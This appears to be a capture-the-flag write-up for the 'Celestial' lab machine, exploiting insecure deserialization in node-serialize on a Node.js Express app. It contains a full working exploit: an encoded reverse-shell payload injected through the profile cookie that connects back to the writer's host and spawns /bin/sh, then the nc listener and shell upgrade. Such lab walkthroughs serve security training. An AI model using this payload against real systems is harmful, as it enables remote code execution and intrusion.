<p><img src="/assets/images/celestial.png" alt="banner" /></p>

<h1 id="celestial-10101085">Celestial: 10.10.10.85</h1>

<h2 id="scanning">Scanning</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p</span> 1-65535 <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-T4</span> 10.10.10.85
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>srbz: 

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org  <span class="o">)</span> at 2018-08-01 19:58 EDT
Warning: 10.10.10.85 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Stats: 0:51:53 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% <span class="k">done</span><span class="p">;</span> ETC: 20:50 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.85
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65491 closed ports, 43 filtered ports
PORT     STATE SERVICE VERSION

3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3395.61 seconds
</code></pre></div></div>

<h4 id="burp">Burp</h4>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /favicon.ico HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0

Accept: */*

Accept-Language: en-GB,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

Connection: close

</code></pre></div></div>

<p>Since this is HTTP, let’s try to decode the Cookie.profile as URL then Base64.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"Dummy"</span>,<span class="s2">"country"</span>:<span class="s2">"Idk Probably Somewhere Dumb"</span>,<span class="s2">"city"</span>:<span class="s2">"Lametown"</span>,<span class="s2">"num"</span>:<span class="s2">"2"</span><span class="o">}</span>
</code></pre></div></div>

<h2 id="gaining-access">Gaining Access</h2>

<p>Untrusted data passed into unserialize() function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).</p>

<p>Pseudo code Server.js</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'cookie-parser'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">escape</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'escape-html'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-serialize'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">())</span>
 
<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">,</span> <span class="s1">'base64'</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
   <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Hey "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" + "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" = "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> 
   <span class="p">}</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">'profile'</span><span class="p">,</span> <span class="s1">'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D'</span><span class="p">,</span> <span class="p">{</span>
       <span class="na">maxAge</span><span class="p">:</span> <span class="mi">900000</span><span class="p">,</span>
       <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
     <span class="p">});</span>
 <span class="p">}</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p nodejsshell.py 10.10.15.172 1337
<span class="o">[</span>+] LHOST <span class="o">=</span> 10.10.15.172
<span class="o">[</span>+] LPORT <span class="o">=</span> 1337
<span class="o">[</span>+] Encoding
<span class="nb">eval</span><span class="o">(</span>String.fromCharCode<span class="o">(</span>10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10<span class="o">))</span>
</code></pre></div></div>

<p>We can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>
</code></pre></div></div>

<p>Bv Using burpSuite, it is easy to edit the HTTP req in a way to encode and inject this payload ;) Juste make sure to encode as Base64 and URL. You can use hot keys <code class="highlighter-rouge">CTRL+B</code> and <code class="highlighter-rouge">CTRL+U</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:61.0<span class="o">)</span> Gecko/20100101 Firefox/61.0

Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8

Accept-Language: en-GB,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5

Accept-Encoding: <span class="nb">gzip</span>, deflate

Cookie: <span class="nv">profile</span><span class="o">={</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>

Connection: close

Upgrade-Insecure-Requests: 1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.15.172 <span class="nt">-p</span> 1337

Connected!
</code></pre></div></div>

<h2 id="maintaining-access">Maintaining Access</h2>

<p>N/A</p>

<h2 id="covering-tasks">Covering Tasks</h2>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">152</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">21</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">1</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">24</span> <span class="o">.</span><span class="n">bash_history</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">220</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">3771</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">13</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Nov</span>  <span class="mi">8</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">16</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">config</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dbus</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Desktop</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">25</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dmrc</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">08</span> <span class="n">Documents</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Downloads</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">8980</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">examples</span><span class="o">.</span><span class="n">desktop</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gconf</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">gnupg</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gvfs</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">6732</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span><span class="n">ICEauthority</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">local</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">4</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">mozilla</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Music</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">nano</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">47</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">node_modules</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">20</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">node_repl_history</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">57</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">npm</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">21</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">40</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Pictures</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">655</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">profile</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Public</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">66</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">selected_editor</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">870</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="n">server</span><span class="o">.</span><span class="n">js</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">0</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">sudo_as_admin_successful</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Templates</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Videos</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">48</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">Xauthority</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">82</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">1302</span> <span class="n">Mar</span>  <span class="mi">7</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span><span class="o">.</span><span class="n">old</span>

<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>  

<span class="n">find</span> <span class="o">-</span><span class="n">iname</span> <span class="s">'user.txt'</span>
<span class="o">./</span><span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cat</span> <span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">9</span><span class="n">a093cd22ce86b7f41db4116e80d0b0f</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/log
<span class="nb">cat </span>syslog
<span class="o">(</span>...<span class="o">)</span>
